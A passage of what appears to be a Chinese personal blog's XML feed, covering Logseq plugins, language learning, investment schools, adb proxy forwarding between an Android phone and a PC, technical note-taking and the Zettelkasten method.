src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-page-tags.png" alt="page-tags"></p><h2 id="logseq-assets-plus"><a href="#logseq-assets-plus" class="headerlink" title="logseq-assets-plus"></a>logseq-assets-plus</h2><p><a href="https://github.com/xyhp915/logseq-assets-plus">https://github.com/xyhp915/logseq-assets-plus</a></p><p>方便插入资源 asset 的插件，快捷键  ctrl&#x2F;cmd+Shift+O 。在Logseq 中插入 asset 的方法是，使用 &#x2F;upload a asset 命令，回车后会弹出一个对话框选择你要保存的文件即可。但是要在一个 block 中插入一个已有的 asset ，只能使用名字搜索，Logseq assets plus 提供了更加丰富的过滤方法。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-asset-plus.png" alt="asset-plus"></p><h2 id="logseq-plugin-mark-map"><a href="#logseq-plugin-mark-map" class="headerlink" title="logseq-plugin-mark-map"></a>logseq-plugin-mark-map</h2><p><a href="https://github.com/vipzhicheng/logseq-plugin-mark-map">https://github.com/vipzhicheng/logseq-plugin-mark-map</a></p><p>将大纲笔记展示为思维导图插件，触发快捷键 mm 。将大纲笔记转化为思维导图，对内容记忆有一些帮助。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_5.png" alt="mark-map"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>Logseq 使用小结 （二）<a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如果语言学习只能做一件事</title>
    <link href="/cn/language_learning/"/>
    <url>/cn/language_learning/</url>
    
    <content type="html"><![CDATA[<p>这是一则语言学习方法的笔记。英语学习是许多人关注的事，英语之所以重要是因为很多信息的第一手资料都是英文的，在维基百科上随便查阅一个词条，再对比一下简中、繁中，英语，就会发现资料的准确性和完善程度都有差距。在阅读外文书籍的时候会遇上同样的问题，国内翻译的版本最大的问题是内容不全，其次是翻译质量问题。</p><p>Youtube 上许多成功的外语学习者强调comprehensible input ，而这篇文章的方法和传统的思路较为接近，发音 + 语法 + shadowing 。</p><hr><h2 id="如果语言学习只能做一件事"><a href="#如果语言学习只能做一件事" class="headerlink" title="如果语言学习只能做一件事"></a>如果语言学习只能做一件事</h2><p>作者 Theia 是一个会五门语言的全球青年。 她分享了一个自己认为最有效的语言学习方法：</p><ol><li>找一篇语料，精读一遍。</li><li>将所有的单词、重要语法、词组放入 anki 纳入自己的单词库。</li><li>跟着录音反复阅读 + shadowing (影子跟读) ，乃至背诵。</li></ol><p>语料库的选择，应当有音频和文本，语法词汇略高于你的水平，最好是自己感兴趣的内容。这个方法坚持一两篇，就会进步挺大，用得越多，进步越大。Theia 学习 英日西荷 语言，都在用这个方法学习。</p><p>shadowing 是一个常见的语言学习方法，在录音播放时不看文本，延迟1秒左右的速度跟着说出内容。shadowing 不但锻炼听力，还可以提升发音和口语。</p><h2 id="语言学习不可以错过的一本书"><a href="#语言学习不可以错过的一本书" class="headerlink" title="语言学习不可以错过的一本书"></a>语言学习不可以错过的一本书</h2><p>Theia 认为 Fluent Forever 是语言爱好者不得不读的书。这本书给出的方法覆盖了整个语言学习，即使是有很丰富语言学习心得的人。练好发音，是语言学习第一件事，也是最重要的一件事。</p><h2 id="语法学习与「有效输入」"><a href="#语法学习与「有效输入」" class="headerlink" title="语法学习与「有效输入」"></a>语法学习与「有效输入」</h2><p>Fluent Forever 中提到一个语言学习方法，恰当地学习语法 (develop a passing familiarity with grammar)。在进行有效输入 (comprehensible input ) 之前，让自己在一定程度上熟悉目标语言语法，可以将句子有逻辑地拆解成可以理解的片段，从而加快语言学习的速度。</p><p>尽量创造语言沉浸环境，可以是阅读，看电影，但最有用的方法是看电视剧。电视剧可以给人带来多感官刺激，却不像电影情节那么紧凑，让你掉入情节中。<br>学习效果：无字幕 &gt; 目标语言字幕 &gt; 中文字幕。</p><p>Theia 还有 《一个多语者的独白》系列文章值得阅读，链接如下：</p><p><a href="https://sspai.com/post/77311">https://sspai.com/post/77311</a><br><a href="https://sspai.com/post/77851">https://sspai.com/post/77851</a><br><a href="https://sspai.com/post/78195">https://sspai.com/post/78195</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] 如果我语言学习只能做一件事…及其他碎碎念 Theia在路上 2024&#x2F;1&#x2F;06<br><a href="https://sspai.com/post/85611">https://sspai.com/post/85611</a></p><p>[2] comprehensible input 英语学习方法<br><a href="https://www.usmacd.com/cn/learning_english/">https://www.usmacd.com/cn/learning_english/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>金融市场中的不同流派</title>
    <link href="/cn/investment_category/"/>
    <url>/cn/investment_category/</url>
    
    <content type="html"><![CDATA[<ul><li>价值投资：价值低估、价值成长 (巴菲特)</li><li>趋势交易：分析市场的方向动力并寻找参与该走势的方法的过程 (理查德.丹尼斯)</li><li>量化交易：高频交易、动量交易、统计套利等  (詹姆斯·西蒙斯)</li><li>市场博弈：以徐总舵主为代表的打板派</li><li>技术分析：通过研究历史交易数据（主要是价格和成交量），来预测未来的价格走势（威廉.江恩）</li><li>投资策略：ETF 指数投资、网格交易、基金定投，投资组合理论 等</li><li>投资哲学：投资方法建立于个人的金融哲学观上 （乔治·索罗斯, 既有宏观择时，又有趋势交易（反身性))</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android 手机使用 PC 代理上网的方法</title>
    <link href="/cn/android_use_proxy_of_pc/"/>
    <url>/cn/android_use_proxy_of_pc/</url>
    
    <content type="html"><![CDATA[<p>在一些特殊的情况下，可能需要使用 Android 手机或者 PC 的线路访问外部网络资源，同时没有条件连接 wifi 网络，这时候可以使用 Android Platform Tools 的 adb 工具来达到目的。</p><p>Android Platform Tools 的下载地址为：<br><a href="https://developer.android.com/tools/releases/platform-tools#downloads">https://developer.android.com/tools/releases/platform-tools#downloads</a></p><h2 id="Android-手机使用-PC-的代理上网的方法"><a href="#Android-手机使用-PC-的代理上网的方法" class="headerlink" title="Android 手机使用 PC 的代理上网的方法"></a>Android 手机使用 PC 的代理上网的方法</h2><p>用 USB 数据线连接 Android 手机和 PC，在 PC 中执行下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell settings put global http_proxy 127.0.0.1:7890<br>adb reverse tcp:7890 tcp:7890<br></code></pre></td></tr></table></figure><p>首先设置 Android 手机 http 全局代理为 127.0.0.1:7890，然后将手机的 127.0.0.1:7890 转发到 PC 127.0.0.1:7890 （没有找到设置 Android 系统全局使用 socks5 代理的方法）</p><p>设置 Android 全局代理需要 android.permission.WRITE_SECURE_SETTINGS 权限，ColorOS 需要在开发者选项中开启 「禁止权限监控」具体方法可以参考：<a href="https://sspai.com/post/67110">在 ColorOS 上免 root 玩机，请先打开这个开关</a>，如果是小米手机可能需要在开发者选项中打开 「USB调试（安全设置）」，我没有小米手机未测试。</p><p>如果需要恢复Android 无代理状态，需要使用下面的命令，一定要记得执行这条恢复命令，否则手机可能无法联网。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell settings delete global http_proxy<br>adb shell settings delete global global_http_proxy_host<br>adb shell settings delete global global_http_proxy_port<br></code></pre></td></tr></table></figure><p>执行 <code>adb reverse</code> 命令后，可以使用 <code>adb reverse --list</code> 查看连接建立情况：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UsbFfs</span> tcp:<span class="hljs-number">7890</span> tcp:<span class="hljs-number">7890</span><br></code></pre></td></tr></table></figure><p>不需要使用时，可以使用 <code>adb reverse --remove</code> 移除转发</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">adb <span class="hljs-keyword">reverse</span> <span class="hljs-comment">--remove tcp:7890</span><br></code></pre></td></tr></table></figure><p>参考 adb 的帮助，执行命令 <code>adb help</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">reverse</span> --<span class="hljs-keyword">list</span>           <span class="hljs-keyword">list</span> <span class="hljs-keyword">all</span> <span class="hljs-built_in">reverse</span> socket connections from device<br><span class="hljs-built_in">reverse</span> [--<span class="hljs-keyword">no</span>-rebind] REMOTE LOCAL<br>    <span class="hljs-built_in">reverse</span> socket connection using:<br>      tcp:<span class="hljs-symbol">&lt;port&gt;</span> (<span class="hljs-symbol">&lt;remote&gt;</span> may <span class="hljs-keyword">be</span> <span class="hljs-string">&quot;tcp:0&quot;</span> <span class="hljs-keyword">to</span> pick any <span class="hljs-keyword">open</span> port)<br>      localabstract:&lt;unix domain socket name&gt;<br>      localreserved:&lt;unix domain socket name&gt;<br>      localfilesystem:&lt;unix domain socket name&gt;<br><span class="hljs-built_in">reverse</span> --<span class="hljs-built_in">remove</span> REMOTE  <span class="hljs-built_in">remove</span> specific <span class="hljs-built_in">reverse</span> socket connection<br><span class="hljs-built_in">reverse</span> --<span class="hljs-built_in">remove</span>-<span class="hljs-keyword">all</span>     <span class="hljs-built_in">remove</span> <span class="hljs-keyword">all</span> <span class="hljs-built_in">reverse</span> socket connections from device<br></code></pre></td></tr></table></figure><h2 id="PC-使用-Android-手机代理上网的方法"><a href="#PC-使用-Android-手机代理上网的方法" class="headerlink" title="PC 使用 Android 手机代理上网的方法"></a>PC 使用 Android 手机代理上网的方法</h2><p>首先在手机上开启 socks5 代理 127.0.0.1:9999, 然后用 USB 数据线连接 Android 手机和 PC，在 PC 中执行下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb forward tcp:7890 tcp:9999<br></code></pre></td></tr></table></figure><p>这样会把 PC 127.0.0.1:7890 转发到手机 127.0.0.1:9999</p><p>使用 <code>adb forward --list</code> 查看连接建立情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">94e22910</span> tcp:<span class="hljs-number">7890</span> tcp:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>不需要使用时，可以使用 <code>adb forward --remove</code> 移除转发</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">adb <span class="hljs-keyword">forward</span> --<span class="hljs-keyword">remove</span> tcp:<span class="hljs-number">7890</span><br></code></pre></td></tr></table></figure><p>参考 adb 的帮助，执行命令 <code>adb help</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">forward --<span class="hljs-keyword">list</span>           <span class="hljs-keyword">list</span> <span class="hljs-keyword">all</span> forward socket connections<br>forward [--<span class="hljs-keyword">no</span>-rebind] LOCAL REMOTE<br>    forward socket connection using:<br>      tcp:<span class="hljs-symbol">&lt;port&gt;</span> (<span class="hljs-symbol">&lt;local&gt;</span> may <span class="hljs-keyword">be</span> <span class="hljs-string">&quot;tcp:0&quot;</span> <span class="hljs-keyword">to</span> pick any <span class="hljs-keyword">open</span> port)<br>      localabstract:&lt;unix domain socket name&gt;<br>      localreserved:&lt;unix domain socket name&gt;<br>      localfilesystem:&lt;unix domain socket name&gt;<br>      dev:&lt;character device name&gt;<br>      jdwp:&lt;process pid&gt; (remote <span class="hljs-keyword">only</span>)<br>      vsock:<span class="hljs-symbol">&lt;CID&gt;</span>:<span class="hljs-symbol">&lt;port&gt;</span> (remote <span class="hljs-keyword">only</span>)<br>      acceptfd:<span class="hljs-symbol">&lt;fd&gt;</span> (listen <span class="hljs-keyword">only</span>)<br>forward --<span class="hljs-built_in">remove</span> LOCAL   <span class="hljs-built_in">remove</span> specific forward socket connection<br>forward --<span class="hljs-built_in">remove</span>-<span class="hljs-keyword">all</span>     <span class="hljs-built_in">remove</span> <span class="hljs-keyword">all</span> forward socket connections<br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] 在 ColorOS 上免 root 玩机，请先打开这个开关 - 克莱德 2021.06.08<br><a href="https://sspai.com/post/67110">https://sspai.com/post/67110</a></p><p>[2] 在 Android 手机上的使用 stunnel - zz 2021.2.24<br><a href="https://www.usmacd.com/cn/android_stunnel/">https://www.usmacd.com/cn/android_stunnel/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何写好一篇技术笔记</title>
    <link href="/cn/how_to_write_technique_note/"/>
    <url>/cn/how_to_write_technique_note/</url>
    
    <content type="html"><![CDATA[<p>翻看前些年的笔记，发现笔记内容的详尽程度将决定未来能留下来多少有用的知识。不论记性多好，大多数内容都会随着时间遗忘在历史的长河中。在得到听了很多课程，基本上能记住的不多，最终能用上的可能还是记录下来的一些东西，古人云：「不动笔墨不读书」还是挺有道理的。</p><p>技术笔记和其他的一般笔记不同，详尽程度将决定笔记的质量，有一些十多年前的笔记我现在已经完全看不懂了，有的文档仅仅写了短短几句，明显没有写完，但真的就再也想不起任何内容了。痛定思痛后，我决定总结一篇如何写技术笔记的文章。</p><h2 id="写技术技术记笔记时，应该注意内容"><a href="#写技术技术记笔记时，应该注意内容" class="headerlink" title="写技术技术记笔记时，应该注意内容"></a>写技术技术记笔记时，应该注意内容</h2><p>写详细的记录是为了在若干年后，可以重现所有的操作，如果上下文有丢失，将遇到很大的困难。反复学习，不断迭代，所有的积累才能有效累加，为了达到这个目的，写技术笔记至少需要做到以下几点：</p><ul><li><ol><li>完整性：必须包括原始需求、先验知识、现有解决方案、具体实践、参考文献。</li></ol><ul><li>具体实践包括不但包括成功的经验还包括失败的尝试</li></ul></li><li><ol start="2"><li>严谨性：所有笔记内容都经过验证，包括参考文献中的结论，没有验证过的就说未验证。</li></ol></li><li><ol start="3"><li>可复现：完整展示环境搭建过程，命令行的所有参数，完整的命令行输出，完整的源代码和编译参数。</li></ol></li><li><ol start="4"><li>深入细节：魔鬼都在细节之中。笔记详细说明各种坑点，关键细节的细微差异。</li></ol><ul><li>刨根问底，使用调试器等工具展示底层的细节。</li></ul></li><li><ol start="5"><li>持续性：反复迭代，在自己感兴趣领域的不断积累。</li></ol></li></ul><p>失败的尝试可能是最容易忽略的地方，明明查询了很多资料，尝试了很多不同的方法，最后记录的只有成功的那一条。有一种可能，在极端的情况下，所有的尝试都失败了，是不是就完全放弃了？<br>如果记录了所有失败的尝试，过一段时间后，你可能重新尝试，但有个前提上下文没有丢失，不然很可能重复走上次失败的尝试。</p><h2 id="参考资料的学问"><a href="#参考资料的学问" class="headerlink" title="参考资料的学问"></a>参考资料的学问</h2><p>我以前写参考资料的时候，只有一个链接，总是觉得这样就足够了，最近感觉应该要写个标题，这样一下就可以看出参考资料的主题。但如果只记录参考资料的链接和标题，其实是存在信息缺失的。<br>从技术演进的角度看，文章发表的时间是非常有意义的，从总体上看技术是进步的，我们应该优先学习先进的方法。作者信息则可以让我们认识领域的专家，靠谱的作者的可信度，应该上调一个级别。</p><p>scz 在微博上举例利用参考资料的时间信息，搜索的例子：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">有些十多年前的微软blog，可能形如:<br>h__p://blogs.technet.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">b</span>/<span class="hljs-symbol">&lt;part0&gt;</span>/archive/<span class="hljs-symbol">&lt;year&gt;</span>/<span class="hljs-symbol">&lt;month&gt;</span>/<span class="hljs-symbol">&lt;day&gt;</span>/<span class="hljs-symbol">&lt;part1&gt;</span>.aspx<br>原链接肯定不存在了，其中一部分可以换成下面这种样子去访问<br>h__ps://learn.microsoft.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">en</span>-us/archive/blogs/<span class="hljs-symbol">&lt;part0&gt;</span>/<span class="hljs-symbol">&lt;part1&gt;</span><br></code></pre></td></tr></table></figure><p>所以，参考资料应该记录：标题、作者、日期、链接</p><h2 id="严谨的记录带来一种有序"><a href="#严谨的记录带来一种有序" class="headerlink" title="严谨的记录带来一种有序"></a>严谨的记录带来一种有序</h2><p>严谨的记录是对内心的一种拷问，要求不断地问自己是否真搞清楚了，有没有遗漏前提条件，是否只是某种巧合。严谨的记录带来一种新的有序，不断完善的基础概念，不断增加的各种尝试&#x2F;方法，从而提供跨出知识边界，跳出思维定势的可能性。</p><h2 id="记笔记的态度比笔记方法重要"><a href="#记笔记的态度比笔记方法重要" class="headerlink" title="记笔记的态度比笔记方法重要"></a>记笔记的态度比笔记方法重要</h2><p>笔记是一笔可以积累的财富，认真写笔记可以在未来的时间里获得复利，态度决定一切，这比所谓第二大脑，卡片笔记法都重要。任何可以持续积累并获得进步的习惯应该坚持下去。对于个人成长来说，不断记录，不断总结，不断分析，才能螺旋前进。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>以 scz 的话结尾：</p><blockquote><p>若自己写的技术文档三个月之后乃至更长时间跨度，不能指导自己的相关工作，该文档严重不合格。该标准很靠谱，诸君可自行检验。</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] 网络安全学习方法之一  scz    2023-09-07 19:43<br>    <a href="https://scz.617.cn/misc/202309071943.txt">https://scz.617.cn/misc/202309071943.txt</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《笔记的方法》 如何做筛选，获取高质量信息</title>
    <link href="/cn/how_to_get_good_info/"/>
    <url>/cn/how_to_get_good_info/</url>
    
    <content type="html"><![CDATA[<p>在信息爆炸时代，我觉得研究如何获得有效信息是非常重要的。在《笔记的方法》中，少楠分享了如何获取优质的信息的方法，分别是：</p><ul><li>做减法：削减你的信息</li><li>做加法：添加书本以外的信息源</li><li>做乘法：用多重视角看待信息</li></ul><h2 id="做减法：削减你的信息源"><a href="#做减法：削减你的信息源" class="headerlink" title="做减法：削减你的信息源"></a>做减法：削减你的信息源</h2><p>稀缺的不是信息，而是我们的注意力。我们需要避免信息过载，分散我们的注意力，这样才能专注有价值的信息。</p><h3 id="方法1：削减利用你情绪的信息源"><a href="#方法1：削减利用你情绪的信息源" class="headerlink" title="方法1：削减利用你情绪的信息源"></a>方法1：削减利用你情绪的信息源</h3><ul><li>比如将被 GPT 取代的 30 个岗位，其中有你的吗？</li></ul><h3 id="方法2：削减让自己过于舒适的信息源"><a href="#方法2：削减让自己过于舒适的信息源" class="headerlink" title="方法2：削减让自己过于舒适的信息源"></a>方法2：削减让自己过于舒适的信息源</h3><ul><li>比如没有增量信息，不能带来新知和启发信息源</li><li>观点很熟悉和认同的信息源，容易培养惰性</li></ul><h3 id="方法3：削减缺乏具体事实的信息源"><a href="#方法3：削减缺乏具体事实的信息源" class="headerlink" title="方法3：削减缺乏具体事实的信息源"></a>方法3：削减缺乏具体事实的信息源</h3><ul><li>没有事实依据、大量春秋笔法、不符合基本逻辑的过于主观的观点的信息源</li></ul><h2 id="做加法：添加书本以外的信息源"><a href="#做加法：添加书本以外的信息源" class="headerlink" title="做加法：添加书本以外的信息源"></a>做加法：添加书本以外的信息源</h2><ul><li>书本信息的第一个问题：书本上的知识不够及时，跟不上新技术</li><li>书本信息的第二个问题：书本上学来的大多是理论，理论和实际情况总是有些差别</li></ul><h3 id="方法1：把他人作为信息源，听实践者言"><a href="#方法1：把他人作为信息源，听实践者言" class="headerlink" title="方法1：把他人作为信息源，听实践者言"></a>方法1：把他人作为信息源，听实践者言</h3><ul><li>1）听实践者讲述事实时，注意他在叙述过程中提及的细节。充满细节的事实信息，远比充满戏剧性的宏大叙事更有价值</li><li>2）听实践者讲述事实时，重点听他复盘失败的经历</li><li>3）尽量不要看第三方的叙述，而要看实践者自己写的文章或接受的采访，确保得到一手的信息</li></ul><h3 id="方法2：亲自下场实践"><a href="#方法2：亲自下场实践" class="headerlink" title="方法2：亲自下场实践"></a>方法2：亲自下场实践</h3><ul><li>1）现场观察，现场调研</li><li>2）投入时间，投入金钱，亲身感受</li></ul><h2 id="做乘法：用多重视角看待信息"><a href="#做乘法：用多重视角看待信息" class="headerlink" title="做乘法：用多重视角看待信息"></a>做乘法：用多重视角看待信息</h2><h3 id="方法1-考察概念"><a href="#方法1-考察概念" class="headerlink" title="方法1: 考察概念"></a>方法1: 考察概念</h3><ul><li>向下看，将模糊的概念界定地更清晰，对客观事物、客观事实的认识会更加深入</li></ul><h3 id="方法2-寻找范式"><a href="#方法2-寻找范式" class="headerlink" title="方法2: 寻找范式"></a>方法2: 寻找范式</h3><ul><li>向上看，寻找可迁移范式，抽象一层</li></ul><h3 id="方法3-顺藤摸瓜"><a href="#方法3-顺藤摸瓜" class="headerlink" title="方法3: 顺藤摸瓜"></a>方法3: 顺藤摸瓜</h3><ul><li>向四周看, 找到信息相关联的线索，逐一捋清</li></ul><h2 id="多个独立信息源，交叉验证"><a href="#多个独立信息源，交叉验证" class="headerlink" title="多个独立信息源，交叉验证"></a>多个独立信息源，交叉验证</h2><p>这点是我补充的，独立信息源很重要，有些时候多个地方的信息其实来自同一个信息源，这样的信息仍然是不可靠的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>卡片盒笔记法总体思路与工作流</title>
    <link href="/cn/zel_note_flow/"/>
    <url>/cn/zel_note_flow/</url>
    
    <content type="html"><![CDATA[<p>我经常在少数派等网站上看到卡片盒笔记的文章，这些文章少则几千字，多则上万字。过于复杂的方法是很难实践的，我尝试用一种简单的方法把卡片盒笔记法说清楚，希望能给大家带来一些帮助。</p><h2 id="卡片盒笔记法核心要义"><a href="#卡片盒笔记法核心要义" class="headerlink" title="卡片盒笔记法核心要义"></a>卡片盒笔记法核心要义</h2><p>1）用自己的话记录最感兴趣，最有用的知识，记录自己的洞见，而不是单纯记录信息<br>2）处理各种想法，探寻想法之间的关联、冲突、拓展，建立成熟的想法集群，并和其他的想法集群联系在一起<br>3) 针对项目或主题调整笔记顺序，根据笔记的邻近度聚合不同的想法，从更高的思维层次上完成各个想法的再拼图</p><h2 id="卡片盒笔记法的关键思路"><a href="#卡片盒笔记法的关键思路" class="headerlink" title="卡片盒笔记法的关键思路"></a>卡片盒笔记法的关键思路</h2><p>卢曼的卡片盒笔记系统不使用预先设定的系统的次序，不按照主题、子主题的方式存放笔记，而是使用固定编号的系统结构。</p><ul><li>卢曼认为卡片盒笔记系统和我们自己是不断发展的，不可能提前几十年就把笔记束缚在某个次序上。</li><li>使用固定编号的方法，将减少我们安排笔记位置的复杂性，使我们可以创造高度复杂的笔记卡片。</li><li>使用固定编号是任意基于内容的系统结构的抽象，将使我们的卡片和笔记系统达到一个更高类型的秩序。</li></ul><p>卢曼的卡片盒笔记系统使用固定编号的方法标记唯一的一条笔记，这种编号系统有很大的优势。</p><ul><li>固定编号使笔记之间能够相互连接</li><li>固定编号使笔记能够任意的内部分叉 (internal branching)，内部生长 (internal growth)</li></ul><hr><ul><li>57&#x2F;12<ul><li>57&#x2F;12a<ul><li>57&#x2F;12a1</li><li>57&#x2F;12a2</li></ul></li><li>57&#x2F;12b</li></ul></li><li>57&#x2F;13</li></ul><hr><p>由于缺乏系统的顺序，需要维护关键字登记册（Register），登记册用于查找笔记，固定编号对于登记册来说是不可或缺的。(这里说的登记册相当于索引卡片)</p><h2 id="四种不同类型笔记"><a href="#四种不同类型笔记" class="headerlink" title="四种不同类型笔记"></a>四种不同类型笔记</h2><p>闪念笔记 ( fleeting notes )，记录脑海中闪过的想法 （必须拥有随时记录想法的工具）</p><p>文献笔记 ( literature notes )，阅读资料都要记笔记，用自己的话记简要记录不想遗忘的、感兴趣的内容。</p><ul><li>内容要精心选择，引文要格外挑剔</li><li>记录参考资料的细节，利于后期跟踪回顾</li></ul><p>永久笔记 ( permanent notes )，参考前两类笔记，用完整的句子准确记录新的想法</p><ul><li>思考前两类笔记和自己的研究、感兴趣的内容，和近期的思考是否有关联</li><li>新输入的信息是否和以前记录的信息或者脑海里的想法有矛盾，互相印证，或者产生了新的想法。新想法是否又引出了什么新问题？</li><li>用完整的句子准确记录新的想法，标注来源和参考资料，做到精确、清晰、简短。</li></ul><p>项目笔记 ( project notes ), 项目笔记只和某个特定的项目有关，项目结束后可以归档或者丢弃</p><ul><li>待办事项、备忘录、文献收集、草稿片段和手稿评论等</li></ul><h2 id="四种不同类型的索引卡片"><a href="#四种不同类型的索引卡片" class="headerlink" title="四种不同类型的索引卡片"></a>四种不同类型的索引卡片</h2><ul><li>主题索引，汇集所有主题相关的笔记，每条笔记用几个关键词简要说明核心内容</li><li>卡片索引，逻辑相关笔记的前一条和后一条，这些笔记可能并不相互邻近</li><li>关联索引，位置相近的不同主题的概览，这些笔记可能具有相同的某个更大主题</li><li>双向索引，两条笔记可以完全没有关系，关联到一起却有可能出现预想不到的效果</li></ul><h2 id="卡片盒笔记法工作流-workflow"><a href="#卡片盒笔记法工作流-workflow" class="headerlink" title="卡片盒笔记法工作流 (workflow)"></a>卡片盒笔记法工作流 (workflow)</h2><h3 id="步骤1：收集资料，写资源笔记"><a href="#步骤1：收集资料，写资源笔记" class="headerlink" title="步骤1：收集资料，写资源笔记"></a>步骤1：收集资料，写资源笔记</h3><ul><li>关注 P.A.R.A 里 Areas 里的领域和 Resources 里感兴趣主题相关的书籍、文章、论文等资料，将他们保存到资料库</li><li>一份资料写一条资源笔记 (block)，在资源笔记中链接原始出处</li></ul><h3 id="步骤2：捕捉灵感，写闪念笔记"><a href="#步骤2：捕捉灵感，写闪念笔记" class="headerlink" title="步骤2：捕捉灵感，写闪念笔记"></a>步骤2：捕捉灵感，写闪念笔记</h3><ul><li>我们可以使用快速笔记软件简要记录飞逝的灵感，在时间紧迫的情况下可以只记录关键字。</li></ul><h3 id="步骤3：阅读资料，写引文笔记"><a href="#步骤3：阅读资料，写引文笔记" class="headerlink" title="步骤3：阅读资料，写引文笔记"></a>步骤3：阅读资料，写引文笔记</h3><ul><li>我们在阅读资料时为每一份资源创建一个页面 (page)，在这个页面中链接原始的资源笔记</li><li>在阅读资料时将感兴趣的引文加粗 ，将加粗后的引文保存在为资料创建的的页面里</li><li>在阅读资料时将最好的引文高亮，这样的引文是加粗的并且是高亮的</li></ul><h3 id="步骤4：参考引文笔记，写文献笔记"><a href="#步骤4：参考引文笔记，写文献笔记" class="headerlink" title="步骤4：参考引文笔记，写文献笔记"></a>步骤4：参考引文笔记，写文献笔记</h3><ul><li>参考引文笔记写文献笔记，做到精简摘要的核心原则：原子原则，用自己的话，保留上下文</li><li>将文献笔记和参考的引文原文 block 做连接</li></ul><h3 id="步骤5：参考闪念笔记和文献笔记，写永久笔记"><a href="#步骤5：参考闪念笔记和文献笔记，写永久笔记" class="headerlink" title="步骤5：参考闪念笔记和文献笔记，写永久笔记"></a>步骤5：参考闪念笔记和文献笔记，写永久笔记</h3><ul><li>参考闪念笔记和文献笔记写永久笔记，永久笔记需要用完整的句子记录新的想法 (洞见)。</li><li>将永久笔记和文献笔记做链接，将永久笔记和其他永久笔记做链接</li><li>如果写永久笔记时参考了闪念笔记，将闪念笔记归档或者删除</li></ul><h3 id="步骤6：参考永久笔记，写-MOCs-笔记"><a href="#步骤6：参考永久笔记，写-MOCs-笔记" class="headerlink" title="步骤6：参考永久笔记，写 MOCs 笔记"></a>步骤6：参考永久笔记，写 MOCs 笔记</h3><ul><li>当永久笔记积累到一定数量，基于永久笔记的内容邻近度使用 MOCs 自顶向下组织相关内容</li></ul><h3 id="步骤7：定期漫游笔记-Random-Notes"><a href="#步骤7：定期漫游笔记-Random-Notes" class="headerlink" title="步骤7：定期漫游笔记 (Random Notes)"></a>步骤7：定期漫游笔记 (Random Notes)</h3><ul><li>在漫游笔记过程中用新视角去审视旧想法，不断迭代自已的想法，螺旋前进。</li></ul><h3 id="步骤8：定期制作索引卡片"><a href="#步骤8：定期制作索引卡片" class="headerlink" title="步骤8：定期制作索引卡片"></a>步骤8：定期制作索引卡片</h3><ul><li>为了能够方便的索引我们的笔记，需要制作索引卡片，按照不同的主题整理。</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><p>定期回顾笔记的好处<br><a href="https://www.usmacd.com/cn/note_review/">https://www.usmacd.com/cn/note_review/</a></p></li><li><p>关于笔记的一些思考<br><a href="https://www.usmacd.com/cn/note/">https://www.usmacd.com/cn/note/</a></p></li><li><p>Communicating with slip boxes - Niklas Luhmann<br><a href="https://luhmann.surge.sh/communicating-with-slip-boxes">https://luhmann.surge.sh/communicating-with-slip-boxes</a></p></li></ol>]]></content>
    
    
    
